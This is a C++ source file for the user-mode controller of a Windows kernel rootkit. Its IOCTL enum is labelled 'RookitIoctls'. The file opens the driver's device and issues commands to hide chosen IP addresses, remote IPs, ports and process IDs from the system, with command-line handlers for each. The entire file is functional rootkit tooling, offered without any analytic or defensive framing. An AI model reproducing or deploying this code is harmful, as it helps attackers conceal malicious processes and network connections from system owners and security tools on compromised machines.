#include "DriverHandler.h"

bool logError(const char* message) 
{
    std::cerr << "ERROR: " << message << " errcode = " << GetLastError();
    return false;
}

bool logInfo(const char* message)
{
    std::cout << "INFO: " << message << std::endl;
    return true;
}

Driver::DriverHandler::DriverHandler()
{
	device_handle_ = CreateFile(
		Driver::DeviceName,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		nullptr,
		OPEN_EXISTING,
		0,
		nullptr
	);
}


Driver::DriverHandler::~DriverHandler()
{
	CloseHandle(device_handle_);
}


BOOL Driver::DriverHandler::check_connection(char* message)
{
	char ReadBuffer[Driver::TestConnectionMaxLength] = { 0 };
	DWORD returned;
	BOOL bRet = DeviceIoControl(
		device_handle_,
		static_cast<DWORD>(Driver::RookitIoctls::TestConnection),
		message,
		(DWORD)strlen(message),
		ReadBuffer,
		sizeof(ReadBuffer),
		&returned,
		nullptr
	);


	if (bRet)
	{
		std::cout << "Message received from kerneland : " << ReadBuffer << std::endl;
	}
	else
	{
		logError("Connection Test Failed.");
	}

	return bRet;
}

BOOL Driver::DriverHandler::hide_ip(const char* message)
{
	IN_ADDR IpAddressBinary{};
	PCSTR Term{};
	NTSTATUS status = RtlIpv4StringToAddressA(message, TRUE, &Term, &IpAddressBinary);
	if (!NT_SUCCESS(status))
	{
		logError("Could not parse ipv4 address\n");
		return false;
	}

	NETHOOK_HIDDEN_CONNECTION HiddenConnection = { 0 };
	HiddenConnection.IpAddress = IpAddressBinary.s_addr;

	DWORD BytesReturned{ 0 };
	BOOL bRet = DeviceIoControl(
		device_handle_,
		static_cast<DWORD>(Driver::RookitIoctls::HideIP),
		&HiddenConnection,
		sizeof(NETHOOK_HIDDEN_CONNECTION),
		nullptr,
		0,
		&BytesReturned,
		nullptr
	);
	return bRet;
}

BOOL Driver::DriverHandler::hide_port(const char* message)
{
	USHORT port_number{ 0 };
	std::stringstream ss(message);
	if (ss >> port_number)
	{
		char* port = const_cast<char*>(message);
		DWORD BytesReturned{ 0 };

		BOOL bRet = DeviceIoControl(
			device_handle_,
			static_cast<DWORD>(Driver::RookitIoctls::HidePort),
			port,
			(DWORD)strlen(port),
			nullptr,
			0,
			&BytesReturned,
			nullptr
		);
		return bRet;
	}
	logError("Port number is not a valid Integer type");
	return FALSE;
}

BOOL Driver::DriverHandler::hide_remote_ip(const char* message)
{
	IN_ADDR IpAddressBinary{};
	PCSTR Term{};
	NTSTATUS status = RtlIpv4StringToAddressA(message, TRUE, &Term, &IpAddressBinary);
	if (!NT_SUCCESS(status))
	{
		logError("Could not parse ipv4 address\n");
		return false;
	}

	NETHOOK_HIDDEN_CONNECTION HiddenConnection = { 0 };
	HiddenConnection.RemoteIpAddress = IpAddressBinary.s_addr;

	DWORD BytesReturned{ 0 };
	BOOL bRet = DeviceIoControl(
		device_handle_,
		static_cast<DWORD>(Driver::RookitIoctls::HideRemoteIP),
		&HiddenConnection,
		sizeof(NETHOOK_HIDDEN_CONNECTION),
		nullptr,
		0,
		&BytesReturned,
		nullptr
	);
	return bRet;
}


BOOL Driver::DriverHandler::hide_connect_pid(const char* message)
{
	USHORT pid_number{ 0 };
	std::stringstream ss(message);
	if (ss >> pid_number)
	{
		char* pid = const_cast<char*>(message);
		DWORD BytesReturned{ 0 };

		BOOL bRet = DeviceIoControl(
			device_handle_,
			static_cast<DWORD>(Driver::RookitIoctls::HideConnectProcessId),
			pid,
			(DWORD)strlen(pid),
			nullptr,
			0,
			&BytesReturned,
			nullptr
		);
		return bRet;
	}
	logError("PID  is not a valid Integer type");
	return FALSE;
}

BOOL Driver::DriverHandler::hide_pid(const char* message)
{
	USHORT pid_number{ 0 };
	std::stringstream ss(message);
	if (ss >> pid_number)
	{
		char* pid = const_cast<char*>(message);
		DWORD BytesReturned{ 0 };

		BOOL bRet = DeviceIoControl(
			device_handle_,
			static_cast<DWORD>(Driver::RookitIoctls::HideProcessId),
			pid,
			(DWORD)strlen(pid),
			nullptr,
			0,
			&BytesReturned,
			nullptr
		);
		return bRet;
	}
	logError("PID  is not a valid Integer type");
	return FALSE;
}

HANDLE Driver::DriverHandler::device_handle()
{
	return device_handle_;
}

int Driver::DriverHandler::CmdCheckConnection(int argc, const char** argv)
{
	if (argc < 3)
	{
		std::cerr << "Missing Parameters For check-connection (<message>)" << std::endl;
		std::cerr << "[+] Enter a message you would like to send to the kernel" << std::endl;
		return -1;
	}

	char* message = const_cast<char*>(argv[2]);
	if ((message != nullptr) && (!check_connection(message)))
	{
		logError("Problem asserting connection with driver\n");
		return -1;
	}
	else
	{
		logInfo("Connected! message echoed successfully");
	}
	return 0;
}

int Driver::DriverHandler::CmdNetHideIp(int argc, const char** argv)
{
	if (argc < 3)
	{
		logError("Missing Parameters For hide-ip (<ip>)\n");
	}

	const char* ip = argv[2];
	if ((ip != nullptr) && (!hide_ip(ip)))
	{
		logError("Couldn't hide IP");
	}
	else
	{
		logInfo("IP Hidden!");
	}
	return 0;
}

int Driver::DriverHandler::CmdNetHidePort(int argc, const char** argv)
{
	if (argc < 3)
	{
		logError("Missing Parameters For hide-port (<port-number>)\n");
	}

	const char* port_number = argv[2];
	if ((port_number != nullptr) && (!hide_port(port_number)))
	{
		logError("Couldn't hide port");
	}
	else
	{
		logInfo("Port Hidden!");
	}

	return 0;
}

int Driver::DriverHandler::CmdNetHideRemoteIp(int argc, const char** argv)
{
	if (argc < 3)
	{
		logError("Missing Parameters For hide-remote-ip (<ip>)\n");
	}

	const char* foreign_ip = argv[2];
	if ((foreign_ip != nullptr) && (!hide_remote_ip(foreign_ip)))
	{
		logError("Couldn't hide Remote IP");
	}
	else
	{
		logInfo("Remote IP Hidden!");
	}
	return 0;
}

int Driver::DriverHandler::CmdNetHideConnectPID(int argc, const char** argv)
{
	if (argc < 3)
	{
		logError("Missing Parameters For hide-connect-pid (<pid>)\n");
	}

	const char* connect_pid = argv[2];
	if ((connect_pid != nullptr) && (!hide_connect_pid(connect_pid)))
	{
		logError("Couldn't hide Connect PID");
	}
	else
	{
		logInfo("Connect PID is Hidden!");
	}
	return 0;
}

int Driver::DriverHandler::CmdNetHidePID(int argc, const char** argv)
{
	if (argc < 3)
	{
		logError("Missing Parameters For hide-pid (<pid>)\n");
	}

	const char* pid = argv[2];
	if ((pid != nullptr) && (!hide_pid(pid)))
	{
		logError("Couldn't hide PID");
	}
	else
	{
		logInfo("PID is Hidden!");
	}
	return 0;
}